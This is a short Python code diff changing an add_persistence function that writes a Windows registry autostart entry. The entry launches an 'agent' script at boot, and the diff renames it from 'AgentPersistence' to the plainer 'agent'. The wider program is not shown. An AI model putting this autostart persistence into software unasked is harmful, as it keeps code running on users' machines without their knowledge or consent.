@@ -87,10 +87,11 @@ def add_persistence():
 
         with reg.ConnectRegistry(None, reg_key) as registry:
             with reg.OpenKey(registry, key, 0, reg.KEY_SET_VALUE) as key:
-                app_name = "AgentPersistence"
+                app_name = "agent"
 
-                command = f'python "{script_path}"'
-
+                python_path = sys.executable
+                command = f'"{python_path}" "{script_path}"'
+                print(command)
                 reg.SetValueEx(key, app_name, 0, reg.REG_SZ, command)
                 print(f"Persistance ajoutée : {app_name} démarrera automatiquement au démarrage.")
     except Exception as e:
